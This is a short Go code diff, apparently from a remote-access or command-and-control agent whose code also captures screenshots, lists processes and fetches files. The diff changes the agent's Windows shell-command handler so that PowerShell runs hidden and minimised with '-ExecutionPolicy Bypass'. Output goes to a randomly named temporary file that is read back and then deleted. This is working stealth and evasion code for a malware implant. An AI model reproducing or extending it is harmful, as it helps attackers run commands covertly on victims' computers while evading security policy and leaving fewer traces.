@@ -18,6 +18,7 @@ import (
 	"runtime"
 	"strconv"
 
+	"github.com/google/uuid"
 	"github.com/mitchellh/go-ps"
 	"github.com/vova616/screenshot"
 )
@@ -251,10 +252,26 @@ func getFile(agent models.NewAgent) (resp string) {
 
 func shellCommand(command string, agent models.NewAgent) string {
 	var resp string
+	tempDir := os.TempDir()
 
 	if agent.OS == "windows" {
-		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
-		resp = string(output)
+
+		tempFile := filepath.Join(tempDir, uuid.New().String()+".log")
+		fmt.Println(tempFile)
+
+		command += fmt.Sprintf(" | Out-File -FilePath %s", tempFile)
+		_, _ = exec.Command("cmd", "/c", "start", "/min", "", "powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy",
+			"Bypass", command).Output()
+
+		fileOpened, err := os.ReadFile(tempFile)
+		if err != nil {
+			resp = fmt.Sprintf("Error to open file: %s", err)
+			return middlewares.B64Encode(resp)
+		}
+		resp = string(fileOpened)
+
+		os.Remove(tempFile)
+
 	} else if agent.OS == "linux" {
 		output, _ := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		resp = string(output)
